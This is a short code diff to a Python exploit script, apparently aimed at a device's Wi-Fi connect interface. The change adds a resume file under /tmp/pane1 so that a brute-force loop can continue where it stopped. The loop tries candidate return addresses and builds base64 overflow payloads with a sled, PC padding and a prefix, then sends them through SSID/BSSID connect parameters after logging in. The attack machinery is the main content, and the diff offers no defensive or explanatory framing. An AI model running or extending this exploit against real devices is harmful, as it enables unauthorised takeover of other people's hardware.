@@ -152,8 +152,18 @@ def main():
         if base is None:
             raise SystemExit("--addr required")
         sess = login(a.host)
-        for i in range(a.count if a.mode == "brute" else 1):
+        idx = "/tmp/pane1/brute.%s.idx" % a.host
+        done = 0
+        if a.mode == "brute" and os.path.exists(idx):
+            try:
+                done = int(open(idx).read().strip())
+            except ValueError:
+                done = 0
+        for i in range(done, a.count if a.mode == "brute" else 1):
             candidate = base + i * a.step
+            if a.mode == "brute":
+                os.makedirs("/tmp/pane1", exist_ok=True)
+                open(idx, "w").write(str(i))
             b64 = build(a.offset, addr=candidate, sled=a.sled, padpc=a.padpc,
                         prefix=a.prefix.encode(), sledfill=a.sledfill)
             params = connect_params(b64, a.ssid, a.bssid)
